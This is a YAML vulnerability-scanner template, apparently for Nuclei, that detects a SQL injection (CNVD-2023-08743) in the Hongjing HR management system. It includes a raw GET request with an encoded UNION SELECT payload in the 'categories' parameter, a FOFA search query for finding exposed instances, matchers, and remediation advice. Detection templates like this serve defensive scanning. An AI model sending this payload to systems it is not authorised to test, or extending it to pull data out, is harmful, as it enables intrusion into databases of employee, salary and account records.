id: CNVD-2023-08743

info:
  name: 宏景人力资源管理系统 SQL 注入漏洞（CNVD-2023-08743）
  author: SleepingBag945
  severity: critical
  description: |
    宏景人力资源管理系统 `codesettree` 接口对查询参数过滤不足，存在 SQL 注入风险。模板在 `categories` 参数中注入 UNION 查询，并通过 XML 响应中的 `hongjing` 与 SQL Server 版本特征确认漏洞。
  impact: |
    - 攻击者可读取人力资源系统数据库中的员工、薪酬、组织架构和账号信息。
    - SQL 注入还可能导致数据篡改、权限提升或进一步控制应用服务器。
  remediation: |
    - 升级宏景人力资源管理系统或应用补丁，修复 `codesettree` 接口注入问题。
    - 对所有查询参数使用参数化 SQL，并对编码后的特殊字符做统一解码校验。
    - 审计数据库错误、异常 UNION 查询和敏感数据访问记录。
  reference:
    - https://www.henry4e36.top/index.php/archives/162.html
    - https://blog.csdn.net/qq_41904294/article/details/130944159
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="人力资源信息管理系统"
  tags: cnvd2023,cnvd,hongjing,hcm,sqli,vuln

http:
  - raw:
      - |
        GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(header,"text/xml")'
          - 'contains_all(body,"TreeNode id=\"hongjing","SQL Server")'
        condition: and
